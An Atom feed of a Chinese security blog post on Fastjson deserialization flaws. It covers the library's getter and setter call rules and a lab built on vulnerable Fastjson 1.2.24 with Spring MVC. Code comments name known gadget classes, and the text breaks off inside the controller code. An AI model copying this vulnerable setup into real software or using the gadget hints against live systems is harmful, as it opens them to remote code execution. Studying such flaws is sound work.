<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>路遇的博客</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-04-12T16:17:44.616Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>code_43</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>fastjson简析利用</title>
    <link href="http://example.com/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>http://example.com/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2022-04-11T00:55:11.182Z</published>
    <updated>2022-04-12T16:17:44.616Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://blog.weik1.top/2021/09/08/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#%E5%89%8D%E8%A8%80">https://blog.weik1.top/2021/09/08/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#%E5%89%8D%E8%A8%80</a></p><p><a href="https://y4er.com/post/fastjson-learn/#fastjson%E6%BC%8F%E6%B4%9E%E5%8E%86%E7%A8%8B">https://y4er.com/post/fastjson-learn/#fastjson%E6%BC%8F%E6%B4%9E%E5%8E%86%E7%A8%8B</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>芭比q了，越学越费，</p><p>Fastjson 阿里开发的一个 Java 库，可用于将 Java 对象转换为其 JSON 格式、 JSON 字符串转换为等效的 Java 对象。Fastjson 1.2.24 版本的远程代码执行漏洞开始，因为官方的各种奇葩修补方式不断被爆出新的反序列化漏洞。</p><p>FastJson 序列化对象为字符串的方法主要就是<code> toJSONString</code> 方法，而反序列化还原对象的方法有三个：<code>parseObject(String text) </code>、<code>parse (String text)</code>、<code>parseObject(String text, Class\ clazz)</code></p><p>其中 <code>parseObject</code>返回 <code>JSONObject</code> 而 <code>parse</code> 返回的是实际类型的对象。当在没有对应类的定义的情况下，通常情况下都会使用 <code>JSON.parseObject</code> 来获取数据。</p><p>总结一下通过这三种方式去反序列化 json 字符串时 getter和setter的调用情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parseObject(String text) `、`parse (String text)`、`parseObject(String text, Class\ clazz)</span><br></pre></td></tr></table></figure><p>parseObject(String text, Class\ clazz)</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">setter</span><br><span class="line">方法名长度大于4且以set开头</span><br><span class="line">非静态函数</span><br><span class="line">返回类型为void或当前类</span><br><span class="line">参数个数为1个</span><br><span class="line">方法为 public 属性</span><br><span class="line"></span><br><span class="line">getter</span><br><span class="line">方法名需要长于4</span><br><span class="line">非静态方法</span><br><span class="line">以 get 字符串开头，且第四个字符需要是大写字母</span><br><span class="line">方法不能有参数</span><br><span class="line">返回值类型继承自Collection \|\| Map \|\| AtomicBoolean \|\| AtomicInteger \|\|AtomicLong</span><br><span class="line">getter 方法对应的属性只能有 getter 不能有setter方法</span><br><span class="line">方法为 public 属性</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>parseObject(String text)</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">setter</span><br><span class="line">方法名长度大于4且以set开头</span><br><span class="line">非静态函数</span><br><span class="line">返回类型为void或当前类</span><br><span class="line">参数个数为1个</span><br><span class="line">public 属性</span><br><span class="line"></span><br><span class="line">getter</span><br><span class="line">方法名长度大于4且以get开头</span><br><span class="line">非静态函数</span><br><span class="line">方法不能有参数</span><br><span class="line">public 属性</span><br></pre></td></tr></table></figure><p>parse (String text)</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">setter</span><br><span class="line">方法名长度大于4且以set开头</span><br><span class="line">非静态函数</span><br><span class="line">返回类型为void或当前类</span><br><span class="line">参数个数为1个</span><br><span class="line">public 属性</span><br><span class="line"></span><br><span class="line">getter</span><br><span class="line">方法名需要长于4</span><br><span class="line">非静态方法</span><br><span class="line">以 get 字符串开头，且第四个字符需要是大写字母</span><br><span class="line">方法不能有参数</span><br><span class="line">返回值类型继承自Collection \|\| Map \|\| AtomicBoolean \|\| AtomicInteger \|\|AtomicLong</span><br><span class="line">getter 方法对应的属性只能有 getter 不能有setter方法</span><br><span class="line">方法为 public 属性</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>来不及详细将搭建了  就这吧。</p><p>pom.xml</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line"></span><br><span class="line">&lt;project xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">  xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class="line">  &lt;modelVersion&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">  &lt;groupId&gt;com.xuan&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line">  &lt;packaging&gt;war&lt;/packaging&gt;</span><br><span class="line"></span><br><span class="line">  &lt;name&gt;fastjson Maven Webapp&lt;/name&gt;</span><br><span class="line">  &lt;!-- FIXME change it to the project<span class="string">&#x27;s website --&gt;</span></span><br><span class="line"><span class="string">  &lt;url&gt;http://www.example.com&lt;/url&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;properties&gt;</span></span><br><span class="line"><span class="string">    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span></span><br><span class="line"><span class="string">    &lt;maven.compiler.source&gt;1.7&lt;/maven.compiler.source&gt;</span></span><br><span class="line"><span class="string">    &lt;maven.compiler.target&gt;1.7&lt;/maven.compiler.target&gt;</span></span><br><span class="line"><span class="string">  &lt;/properties&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;dependencies&gt;</span></span><br><span class="line"><span class="string">    &lt;dependency&gt;</span></span><br><span class="line"><span class="string">      &lt;groupId&gt;junit&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">      &lt;artifactId&gt;junit&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">      &lt;version&gt;4.11&lt;/version&gt;</span></span><br><span class="line"><span class="string">      &lt;scope&gt;test&lt;/scope&gt;</span></span><br><span class="line"><span class="string">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;dependency&gt;</span></span><br><span class="line"><span class="string">      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">      &lt;version&gt;1.2.24&lt;/version&gt;</span></span><br><span class="line"><span class="string">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;dependency&gt;</span></span><br><span class="line"><span class="string">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">      &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">      &lt;version&gt;5.1.9.RELEASE&lt;/version&gt;</span></span><br><span class="line"><span class="string">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="string">    &lt;dependency&gt;</span></span><br><span class="line"><span class="string">      &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">      &lt;artifactId&gt;servlet-api&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">      &lt;version&gt;2.5&lt;/version&gt;</span></span><br><span class="line"><span class="string">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="string">    &lt;dependency&gt;</span></span><br><span class="line"><span class="string">      &lt;groupId&gt;javax.servlet.jsp&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">      &lt;artifactId&gt;jsp-api&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">      &lt;version&gt;2.2&lt;/version&gt;</span></span><br><span class="line"><span class="string">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="string">    &lt;dependency&gt;</span></span><br><span class="line"><span class="string">      &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">      &lt;artifactId&gt;jstl&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">      &lt;version&gt;1.2&lt;/version&gt;</span></span><br><span class="line"><span class="string">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;/dependencies&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;build&gt;</span></span><br><span class="line"><span class="string">    &lt;finalName&gt;fastjson&lt;/finalName&gt;</span></span><br><span class="line"><span class="string">    &lt;pluginManagement&gt;&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span></span><br><span class="line"><span class="string">      &lt;plugins&gt;</span></span><br><span class="line"><span class="string">        &lt;plugin&gt;</span></span><br><span class="line"><span class="string">          &lt;artifactId&gt;maven-clean-plugin&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">          &lt;version&gt;3.1.0&lt;/version&gt;</span></span><br><span class="line"><span class="string">        &lt;/plugin&gt;</span></span><br><span class="line"><span class="string">        &lt;!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging --&gt;</span></span><br><span class="line"><span class="string">        &lt;plugin&gt;</span></span><br><span class="line"><span class="string">          &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">          &lt;version&gt;3.0.2&lt;/version&gt;</span></span><br><span class="line"><span class="string">        &lt;/plugin&gt;</span></span><br><span class="line"><span class="string">        &lt;plugin&gt;</span></span><br><span class="line"><span class="string">          &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">          &lt;version&gt;3.8.0&lt;/version&gt;</span></span><br><span class="line"><span class="string">        &lt;/plugin&gt;</span></span><br><span class="line"><span class="string">        &lt;plugin&gt;</span></span><br><span class="line"><span class="string">          &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">          &lt;version&gt;2.22.1&lt;/version&gt;</span></span><br><span class="line"><span class="string">        &lt;/plugin&gt;</span></span><br><span class="line"><span class="string">        &lt;plugin&gt;</span></span><br><span class="line"><span class="string">          &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">          &lt;version&gt;3.2.2&lt;/version&gt;</span></span><br><span class="line"><span class="string">        &lt;/plugin&gt;</span></span><br><span class="line"><span class="string">        &lt;plugin&gt;</span></span><br><span class="line"><span class="string">          &lt;artifactId&gt;maven-install-plugin&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">          &lt;version&gt;2.5.2&lt;/version&gt;</span></span><br><span class="line"><span class="string">        &lt;/plugin&gt;</span></span><br><span class="line"><span class="string">        &lt;plugin&gt;</span></span><br><span class="line"><span class="string">          &lt;artifactId&gt;maven-deploy-plugin&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">          &lt;version&gt;2.8.2&lt;/version&gt;</span></span><br><span class="line"><span class="string">        &lt;/plugin&gt;</span></span><br><span class="line"><span class="string">      &lt;/plugins&gt;</span></span><br><span class="line"><span class="string">    &lt;/pluginManagement&gt;</span></span><br><span class="line"><span class="string">  &lt;/build&gt;</span></span><br><span class="line"><span class="string">&lt;/project&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xuan;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Stu</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String sb;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Stu</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(String sex)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setSex&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.sex =sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">package com.xuan;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line">import com.alibaba.fastjson.serializer.ObjectArrayCodec;</span><br><span class="line">import com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line">public class Demotest extends Fast &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String jsonstring =&quot;&#123;\&quot;@type\&quot;:\&quot;com.xuan.Stu\&quot;,\&quot;age\&quot;:80,\&quot;name\&quot;:\&quot;ghtwf01\&quot;,\&quot;sex\&quot;:\&quot;man\&quot;&#125;&quot;;</span><br><span class="line">        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        Object obj = JSON.parseObject(jsonstring);</span><br><span class="line">        //com.alibaba.fastjson.parser.ParserConfig</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass());</span><br><span class="line">        //com.alibaba.fastjson.util.JavaBeanInfo</span><br><span class="line">        //com.sun.rowset.JdbcRowSetImpl</span><br><span class="line">        //com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>springmvc 版本</p><p>beans.xml</p><p>这里配置fastjson 是因为默认spring json 不是使用fastjson解析的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:util</span>=<span class="string">&quot;http://www.springframework.org/schema/util&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/util https://www.springframework.org/schema/util/spring-util.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.xuan&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:message-converters</span> <span class="attr">register-defaults</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 配置Fastjson支持 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.alibaba.fastjson.support.spring.FastJsonHttpMessageConverter&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;supportedMediaTypes&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">value</span>&gt;</span>text/html;charset=UTF-8<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">value</span>&gt;</span>application/json<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;features&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">value</span>&gt;</span>WriteMapNullValue<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">value</span>&gt;</span>QuoteFieldNames<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--处理器映射器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 处理器设配器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 处理器视图解析器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span> <span class="attr">id</span>=<span class="string">&quot;InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/jsp/&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>控制器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 